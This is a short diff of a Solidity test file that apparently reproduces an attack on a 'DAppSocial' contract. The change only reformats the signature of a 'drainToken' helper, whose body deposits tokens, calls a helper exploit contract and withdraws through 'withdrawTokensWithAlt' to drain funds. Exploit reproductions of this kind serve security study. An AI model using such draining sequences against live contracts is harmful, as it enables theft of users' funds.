@@ -63,7 +63,9 @@ contract DAppTest is Test {
         );
     }
 
-    function drainToken(address token) internal {
+    function drainToken(
+        address token
+    ) internal {
         DAppSocial.depositTokens(token, 2e6);
         helperExploitContract.exploit(token, false);
         DAppSocial.withdrawTokensWithAlt(token, address(helperExploitContract), 1e6);
